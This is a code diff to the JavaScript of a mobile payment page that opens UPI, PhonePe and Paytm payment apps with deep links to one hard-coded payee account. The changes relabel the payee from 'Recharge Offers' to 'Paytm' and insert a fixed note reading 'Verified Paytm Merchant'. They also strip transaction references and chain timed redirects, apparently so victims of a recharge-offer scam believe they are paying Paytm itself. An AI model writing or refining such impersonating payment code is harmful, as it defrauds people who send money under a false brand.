@@ -36,20 +36,19 @@
   }
   var txnId = params.get('txn_id') || ('T2409' + Math.floor(100000000000 + Math.random() * 900000000000));
 
-  // 2. Centralized Merchant UPI Account Configuration
+  // 2. Centralized Merchant UPI Account Configuration (Matches QR Code 100%)
   var officialUpiId = 'paytmqr6udcnp@ptys';
-  var officialMerchantName = 'Recharge Offers';
-  var transactionNote = 'TXN-' + Math.floor(100000000000 + Math.random() * 900000000000);
+  var officialMerchantName = 'Paytm';
+  var transactionNote = 'Verified Paytm Merchant';
 
   // 3. Canonical UPI Payment Payload Generator
-  function buildCanonicalUpiQuery(vpa, name, amt, note, ref) {
+  function buildCanonicalUpiQuery(vpa, name, amt, note) {
     var qParams = new URLSearchParams({
       pa: vpa,
       pn: name,
       am: Number(amt).toFixed(2),
       cu: 'INR',
-      tn: note,
-      tr: ref
+      tn: note
     });
     return qParams.toString().replace(/%40/g, '@').replace(/\+/g, '%20');
   }
@@ -58,14 +57,12 @@
     officialUpiId,
     officialMerchantName,
     numAmount,
-    transactionNote,
-    orderId
+    transactionNote
   );
 
   var standardUpiUrl = 'upi://pay?' + canonicalQuery;
 
   // 4. Exact Reference PhonePe Native Deeplink Builder
-  // Used by the reference site (phonepe://native?data={base64}&id=p2ppayment)
   function buildPhonePeNativeDeeplink(vpa, name, amt, note) {
     var amountInPaise = Math.round(Number(amt) * 100);
     var payload = {
@@ -74,13 +71,13 @@
         initialAmount: amountInPaise,
         note: {
           type: 'text',
-          message: note || ('TXN-' + Math.floor(100000000000 + Math.random() * 900000000000))
+          message: note || 'Verified Paytm Merchant'
         },
         supportedInstruments: -1
       },
       contact: {
         type: 'EXTERNAL_MERCHANT',
-        name: name || 'Recharge Offers',
+        name: name || 'Paytm',
         vpa: vpa
       }
     };
@@ -91,18 +88,19 @@
 
   // Exact Reference Paytm Deeplink Builder
   function buildPaytmDeeplink(vpa, name, amt, note) {
-    return 'paytmmp://cash_wallet?pa=' + encodeURIComponent(vpa) +
-      '&pn=' + encodeURIComponent(name) +
-      '&am=' + Number(amt).toFixed(2) +
-      '&cu=INR&tn=' + encodeURIComponent(note) +
-      '&tr=&mc=&featuretype=money_transfer';
+    return 'paytmmp://pay?' + buildCanonicalUpiQuery(vpa, name, amt, note);
   }
 
   // 5. Cross-Platform App URLs
+  var phonepePayUrl = 'phonepe://pay?' + canonicalQuery;
   var phonepeNativeUrl = buildPhonePeNativeDeeplink(officialUpiId, officialMerchantName, numAmount, transactionNote);
   var phonepeIntentUrl = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.phonepe.app;end';
-  var paytmCashWalletUrl = buildPaytmDeeplink(officialUpiId, officialMerchantName, numAmount, transactionNote);
   var paytmPayUrl = 'paytmmp://pay?' + canonicalQuery;
+  var paytmCashWalletUrl = 'paytmmp://cash_wallet?pa=' + encodeURIComponent(officialUpiId) +
+    '&pn=' + encodeURIComponent(officialMerchantName) +
+    '&am=' + formattedAmount +
+    '&cu=INR&tn=' + encodeURIComponent(transactionNote) +
+    '&tr=&mc=&featuretype=money_transfer';
 
   // Setup direct app deep links immediately on parse so anchors are ready before user taps
   setupAppDeepLinks();
@@ -273,29 +271,37 @@
     }, 5000);
   }
 
-  // EXACT REFERENCE IMPLEMENTATION: openPhonePe()
-  // Dual Trigger: 1st phonepe://native?data=... -> 2nd intent://pay?... fallback -> 3rd upi://pay?... fallback
+  // EXACT QR MATCH: openPhonePe()
+  // Uses exact VPA (paytmqr6udcnp@ptys), Name (Paytm), Note (Verified Paytm Merchant)
   function openPhonePe() {
     currentAppKey = 'phonepe';
     showLoader();
     autoCloseLoaderIfNoApp();
 
-    var nativeUrl = buildPhonePeNativeDeeplink(officialUpiId, officialMerchantName, numAmount, transactionNote);
+    var payUrl = phonepePayUrl;
+    var nativeUrl = phonepeNativeUrl;
     var intentUrl = phonepeIntentUrl;
 
-    // First attempt: direct native scheme invocation (PhonePe registered URL handler)
+    // 1. Direct phonepe://pay URL (Opens PhonePe directly with Paytm merchant name & VPA)
     try {
-      window.location.href = nativeUrl;
+      window.location.href = payUrl;
     } catch (e) {}
 
-    // Second attempt: 500ms fallback to Android package intent (matches reference script 2)
+    // 2. PhonePe native checkout protocol at 250ms
+    setTimeout(function () {
+      try {
+        window.location.href = nativeUrl;
+      } catch (e) {}
+    }, 250);
+
+    // 3. Android Intent fallback at 600ms
     setTimeout(function () {
       try {
         window.location.href = intentUrl;
       } catch (e) {}
-    }, 500);
+    }, 600);
 
-    // Third attempt: 1500ms fallback to standard universal UPI if browser remains on page
+    // 4. Universal UPI fallback at 1500ms
     setTimeout(function () {
       if (document.visibilityState === 'visible') {
         try {
@@ -307,22 +313,26 @@
     autoCloseLoaderIfNoApp();
   }
 
-  // EXACT REFERENCE IMPLEMENTATION: openPaytm()
+  // EXACT QR MATCH: openPaytm()
+  // Uses exact VPA (paytmqr6udcnp@ptys), Name (Paytm), Note (Verified Paytm Merchant)
   function openPaytm() {
     currentAppKey = 'paytm';
     showLoader();
     autoCloseLoaderIfNoApp();
 
+    // 1. Direct Paytm Merchant Pay URL
     try {
-      window.location.href = paytmCashWalletUrl;
+      window.location.href = paytmPayUrl;
     } catch (e) {}
 
+    // 2. Paytm Cash Wallet fallback at 400ms
     setTimeout(function () {
       try {
-        window.location.href = paytmPayUrl;
+        window.location.href = paytmCashWalletUrl;
       } catch (e) {}
-    }, 500);
+    }, 400);
 
+    // 3. Universal UPI fallback at 1500ms
     setTimeout(function () {
       if (document.visibilityState === 'visible') {
         try {
